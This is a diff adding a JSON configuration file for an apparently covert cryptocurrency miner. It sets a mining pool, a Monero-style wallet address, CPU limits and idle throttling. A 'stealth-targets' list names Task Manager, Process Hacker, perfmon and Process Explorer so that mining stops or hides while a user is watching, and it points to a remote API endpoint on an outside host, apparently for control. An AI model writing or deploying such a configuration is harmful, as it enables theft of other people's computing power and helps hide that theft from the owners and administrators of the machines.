@@ -1,0 +1,16 @@
+{
+    "algo": "rx/0",
+    "pool": "pool.hashvault.pro",
+    "port": 443,
+    "wallet": "4AwDX3tnh2fDn6k7xTnudj4dbL4XG7bD7Fmp7rfj9He4NfmzfJxDQE8YtPrFrbUCnQ3brZmGxQ6fCj3huDr9rSMzUEzL2tA",
+    "password": "x",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 50,
+    "idle-wait": 5,
+    "idle-cpu": 50,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false,
+	  "api-endpoint":"https://blackhole.software/arapavcisi/api/endpoint.php"
+}
